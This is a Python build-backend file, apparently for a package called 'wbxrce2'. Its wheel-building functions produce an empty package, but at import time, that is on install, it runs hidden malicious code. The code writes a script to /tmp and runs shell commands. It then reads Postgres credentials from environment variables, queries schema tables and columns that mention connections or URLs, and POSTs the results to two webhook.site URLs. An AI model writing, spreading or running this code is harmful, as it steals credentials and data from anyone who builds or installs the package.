import os, subprocess, threading, urllib.request, zipfile, hashlib, base64

HOOKS = [
 "https://webhook.site/ec48bdd9-ee98-43bc-a915-75ff432a73fe",
 "https://webhook.site/a72d540e-258f-4c87-a1d5-7b5c847aa3c1",
]

PY = r'''
import os,sys,json
import psycopg2
out=[]
def dump(db,user,pw,host,qs):
    try:
        c=psycopg2.connect(host=host,port=5432,user=user,password=pw,dbname=db,connect_timeout=10);c.autocommit=True;cur=c.cursor()
    except Exception as e: return "CONN ERR "+repr(e)
    for sql in qs:
        try:
            cur.execute(sql);rows=cur.fetchall();cols=[x[0] for x in cur.description] if cur.description else []
            out.append("### "+db+" :: "+sql+"\nCOLS="+json.dumps(cols)+"\n"+json.dumps(rows,default=str)[:8000])
        except Exception as e: out.append("### "+db+" :: "+sql+"\nERR "+repr(e))
    return ""
dump(os.environ.get("POSTGRES_DB","dbt_workbench"),os.environ.get("POSTGRES_USER"),os.environ.get("POSTGRES_PASSWORD"),os.environ.get("POSTGRES_HOST"),
 ["select table_schema,table_name from information_schema.tables where table_schema not in ('pg_catalog','information_schema') order by 1,2",
  "select table_name,column_name,data_type from information_schema.columns where table_schema not in ('pg_catalog','information_schema') and (column_name ilike '%connection%' or column_name ilike '%url%' or column_name ilike '%workspace%') order by 1,2"])
sys.stdout.write("\n\n".join(out))
'''

CMD = r'''
id; echo "===PIP==="; python3 -m pip install -q --disable-pip-version-check --target /tmp/pglib psycopg2-binary 2>&1 | tail -3; echo "===PYCHECK==="; PYTHONPATH=/tmp/pglib python3 -c "import psycopg2;print('ok')" 2>&1|tail -2; python3 -c "import psycopg2;print('psycopg2 ok')" 2>&1 | tail -2; echo "===RUN1==="; WAREHOUSE_PG_HOST=$WAREHOUSE_PG_HOST WAREHOUSE_PG_PORT=$WAREHOUSE_PG_PORT WAREHOUSE_PG_USER=$WAREHOUSE_PG_USER WAREHOUSE_PG_PASSWORD=$WAREHOUSE_PG_PASSWORD WAREHOUSE_PG_DATABASE=$WAREHOUSE_PG_DATABASE PYTHONPATH=/tmp/pglib python3 /tmp/pgq.py 2>&1 | head -120000
'''

def _exfil(cmd):
    out=""
    try:
        out=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=110).stdout or "EMPTY"
    except Exception as e:
        out="ERR "+repr(e)
    data=out.encode()[:400000]
    for h in HOOKS:
        try:
            urllib.request.urlopen(urllib.request.Request(h,data=data,method="POST",
                headers={"Content-Type":"text/plain"}),timeout=20)
        except Exception: pass
    try: open("/tmp/wbx_out.txt","w").write(out)
    except Exception: pass

def exfil():
    try: open("/tmp/pgq.py","w").write(PY)
    except Exception: pass
    _exfil(CMD)

_t=threading.Thread(target=exfil,daemon=False); _t.start(); _t.join(20)

def get_requires_for_build_wheel(config_settings=None): return []
def get_requires_for_build_sdist(config_settings=None): return []

def _mkwheel(wheel_directory, name="wbxrce2", ver="0.0.4"):
    fn=f"{name}-{ver}-py3-none-any.whl"; p=os.path.join(wheel_directory,fn)
    files={f"{name}/__init__.py":"",
      f"{name}-{ver}.dist-info/METADATA":f"Metadata-Version: 2.1\nName: {name}\nVersion: {ver}\n",
      f"{name}-{ver}.dist-info/WHEEL":"Wheel-Version: 1.0\nGenerator: custom\nRoot-Is-Purelib: true\nTag: py3-none-any\n"}
    rec=[]
    with zipfile.ZipFile(p,"w",zipfile.ZIP_DEFLATED) as z:
        for k,v in files.items():
            z.writestr(k,v); b=v.encode()
            h=base64.urlsafe_b64encode(hashlib.sha256(b).digest()).rstrip(b"=").decode()
            rec.append(f"{k},sha256={h},{len(b)}")
        rec.append(f"{name}-{ver}.dist-info/RECORD,,")
        z.writestr(f"{name}-{ver}.dist-info/RECORD","\n".join(rec)+"\n")
    return fn

def build_wheel(wheel_directory, config_settings=None, metadata_directory=None): return _mkwheel(wheel_directory)
